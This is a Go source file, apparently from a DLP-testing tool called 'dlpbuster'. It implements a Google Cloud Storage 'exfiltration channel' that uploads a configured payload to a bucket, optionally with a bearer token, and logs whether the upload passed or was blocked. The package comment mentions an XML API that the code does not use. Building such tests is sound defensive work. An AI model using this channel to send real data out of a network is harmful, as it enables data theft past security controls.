// Package gcs implements a GCP Cloud Storage exfiltration channel.
// Uses the XML API (S3-compatible) for unauthenticated/public bucket uploads,
// or the JSON API with a bearer token when credentials are configured.
package gcs

import (
	"bytes"
	"context"
	"fmt"
	"net/http"
	"time"

	"github.com/hssn-research/dlpbuster/internal/channels"
)

// Channel implements channels.Channel for GCS exfiltration.
type Channel struct{}

// New returns a new GCS Channel.
func New() *Channel { return &Channel{} }

// Name returns the channel identifier.
func (c *Channel) Name() string { return "gcs" }

// Description returns a one-line description.
func (c *Channel) Description() string {
	return "Simulate data exfiltration via GCP Cloud Storage upload"
}

// Run uploads the payload to a configured GCS bucket.
func (c *Channel) Run(ctx context.Context, cfg channels.ChannelConfig) channels.Result {
	result := channels.Result{Channel: c.Name()}
	start := time.Now()

	if cfg.GCSBucket == "" {
		result.Status = channels.StatusSkipped
		result.Evidence = []string{"gcs: no bucket configured"}
		result.Duration = time.Since(start)
		return result
	}

	now := time.Now().UTC()
	objectName := fmt.Sprintf("dlpbuster/%s/payload.bin", now.Format("2006-01-02T15-04-05"))

	// Use GCS JSON API (simple media upload); allow endpoint override for anonymous/public buckets.
	baseAPI := "https://storage.googleapis.com"
	if cfg.GCSEndpoint != "" {
		baseAPI = cfg.GCSEndpoint
	}
	uploadURL := fmt.Sprintf(
		"%s/upload/storage/v1/b/%s/o?uploadType=media&name=%s",
		baseAPI, cfg.GCSBucket, objectName,
	)

	req, err := http.NewRequestWithContext(ctx, http.MethodPost, uploadURL, bytes.NewReader(cfg.Payload))
	if err != nil {
		result.Status = channels.StatusError
		result.Error = fmt.Errorf("gcs: build request: %w", err)
		result.Duration = time.Since(start)
		return result
	}
	req.Header.Set("Content-Type", "application/octet-stream")
	if cfg.GCSCredentials != "" {
		req.Header.Set("Authorization", "Bearer "+cfg.GCSCredentials)
	}

	client := &http.Client{Timeout: 15 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		result.Status = channels.StatusBlocked
		result.Evidence = []string{fmt.Sprintf("gcs: upload failed: %v", err)}
		result.Duration = time.Since(start)
		return result
	}
	defer resp.Body.Close()

	evidence := []string{fmt.Sprintf("POST %s → %d %s", uploadURL, resp.StatusCode, http.StatusText(resp.StatusCode))}

	if resp.StatusCode >= 200 && resp.StatusCode < 300 {
		result.Status = channels.StatusPassed
		result.BytesSent = len(cfg.Payload)
	} else {
		result.Status = channels.StatusBlocked
	}
	result.Evidence = evidence
	result.Duration = time.Since(start)
	return result
}
